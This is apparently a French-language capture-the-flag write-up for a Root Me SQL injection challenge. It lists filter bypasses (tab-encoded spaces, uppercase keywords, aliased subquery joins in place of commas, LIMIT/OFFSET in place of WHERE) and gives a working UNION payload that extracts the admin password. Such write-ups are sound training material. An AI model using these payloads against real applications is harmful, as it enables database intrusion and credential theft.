# -SQL-injection---Contournement-de-filtres
 SQL injection - Contournement de filtres (challenge root me 80pt)

Description courte : Nous allons injecter dans le paramètre id ici.

![image](https://github.com/user-attachments/assets/2f36be91-3947-4aa1-a9bf-ecb908886649)

Les caractères filtrés et leurs contournements :

    Espaces → remplacer par %09 (tabulation)

    "select" → remplacer par "SELECT" (majuscules)

    "union" → remplacer par "UNION" (majuscules)

    "join" → remplacer par "JOIN" (majuscules)

    "select 1,2" (virgule filtrée) → remplacer par :
    (SELECT 1) AS A JOIN (SELECT 2) AS B
    (Note : Sans alias pour les sous-requêtes, erreur "Every derived table must have its own alias")

    "where" → remplacer par limit et offset

Indice du code source : la table a 4 colonnes.

![image](https://github.com/user-attachments/assets/eaf32426-edf5-43a6-8e47-34205fab5af8)

Payload de base :
0 UNION SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C JOIN (SELECT 4) AS D

Version adaptée :
0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%094)%09AS%09D

Payload final pour récupérer le mot de passe admin :
0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%09pass%09From%09membres%09LIMIT%091%09OFFSET%090%09)%09AS%09D



